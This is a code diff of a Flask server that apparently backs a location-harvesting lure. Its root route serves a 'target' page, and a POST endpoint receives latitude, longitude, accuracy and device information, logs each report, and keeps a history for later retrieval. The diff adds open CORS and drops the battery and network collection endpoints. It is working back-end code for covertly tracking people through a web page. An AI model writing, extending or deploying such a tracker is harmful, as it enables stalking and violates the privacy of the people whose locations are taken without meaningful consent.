@@ -1,30 +1,20 @@
 from flask import Flask, request, render_template, jsonify
+from flask_cors import CORS
 import os
 from datetime import datetime
 
 app = Flask(__name__)
+CORS(app)
 
-# =============================================
-# DATA STORAGE (No Telegram)
-# =============================================
-
+# Data storage
 latest_location = {
     "lat": None,
     "lng": None,
     "accuracy": None,
-    "altitude": None,
-    "heading": None,
-    "speed": None,
     "timestamp": None,
-    "device_info": None,
-    "battery": None,
-    "network": None
+    "device_info": None
 }
 location_history = []
-
-# =============================================
-# ROUTES
-# =============================================
 
 @app.route('/')
 def target_page():
@@ -33,45 +23,21 @@ def target_page():
 @app.route('/send-location', methods=['POST'])
 def receive_location():
     global latest_location, location_history
-
     data = request.get_json()
+    print(f"📍 Location Received: {data}")
 
     location_data = {
         "lat": data.get('lat'),
         "lng": data.get('lng'),
         "accuracy": data.get('accuracy'),
-        "altitude": data.get('altitude'),
-        "heading": data.get('heading'),
-        "speed": data.get('speed'),
         "device_info": data.get('device_info'),
-        "battery": data.get('battery'),
-        "network": data.get('network'),
         "timestamp": datetime.now().isoformat()
     }
-
     latest_location = location_data
     location_history.append(location_data)
-
     if len(location_history) > 100:
         location_history.pop(0)
 
-    print(f"📍 Location Received: {location_data}")
-    print(f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-
-    return jsonify({"status": "ok"})
-
-@app.route('/send-battery', methods=['POST'])
-def receive_battery():
-    data = request.get_json()
-    latest_location['battery'] = data
-    print(f"🔋 Battery: {data}")
-    return jsonify({"status": "ok"})
-
-@app.route('/send-network', methods=['POST'])
-def receive_network():
-    data = request.get_json()
-    latest_location['network'] = data
-    print(f"📶 Network: {data}")
     return jsonify({"status": "ok"})
 
 @app.route('/get-location')
@@ -91,9 +57,7 @@ def clear_location():
     global latest_location, location_history
     latest_location = {
         "lat": None, "lng": None, "accuracy": None,
-        "altitude": None, "heading": None, "speed": None,
-        "timestamp": None, "device_info": None,
-        "battery": None, "network": None
+        "timestamp": None, "device_info": None
     }
     location_history = []
     return jsonify({"status": "cleared"})
